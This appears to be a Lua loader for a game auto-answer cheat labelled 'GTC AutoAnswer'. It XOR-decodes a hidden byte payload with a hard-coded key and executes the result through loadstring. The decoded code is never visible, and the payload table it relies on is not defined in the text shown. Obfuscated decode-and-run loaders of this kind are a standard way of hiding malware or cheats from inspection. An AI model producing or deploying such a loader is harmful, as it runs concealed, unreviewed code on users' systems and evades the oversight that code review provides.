
local _key = {72,203,122,226,76,216,39,42,54,109}

local function _xor(a, b)
    local r, p = 0, 1
    while a > 0 or b > 0 do
        local ab, bb = a % 2, b % 2
        if ab ~= bb then r = r + p end
        a = (a - ab) / 2
        b = (b - bb) / 2
        p = p * 2
    end
    return r
end

local _buf, _idx = {}, 0
for _, chunk in ipairs(_chunks) do
    for i = 1, #chunk do
        _idx = _idx + 1
        local b = string.byte(chunk, i)
        local k = _key[((_idx - 1) % #_key) + 1]
        _buf[_idx] = string.char(_xor(b, k))
    end
end

local _src = table.concat(_buf)
local _fn, _err = loadstring(_src)
if not _fn then
    warn("[GTC AutoAnswer] failed to load: " .. tostring(_err))
    return
end
_fn()
